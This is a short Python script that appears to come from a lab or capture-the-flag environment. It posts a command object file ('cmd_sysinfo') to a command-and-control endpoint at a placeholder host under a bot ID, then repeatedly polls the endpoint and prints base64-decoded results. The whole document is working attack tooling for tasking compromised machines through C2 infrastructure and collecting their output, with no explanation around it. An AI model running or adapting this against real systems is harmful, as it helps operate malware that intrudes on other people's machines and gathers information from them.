import time
import requests
from base64 import b64decode
import re

def main():

    url = "http://shady-aggregator.utl/f52e6101/"
    id = "DEADBEEFDEADBEEF" 
    valid_command_object = "/home/kali/c2_server/cmd_sysinfo"
    object_contents = open(valid_command_object, "rb").read()
    file_form = {"file": object_contents}

    for _ in range(100):

        requests.post(url + id + "/commands", files=file_form)
        response = requests.get(url + id + "/commands").text
        base64_string = re.search(r'(?<=\n)([A-Za-z0-9+/=]+)(?=\n)', response)
        if base64_string:
            print(b64decode(base64_string.group(0)))
        time.sleep(1)
  

if __name__ == "__main__":
    main()
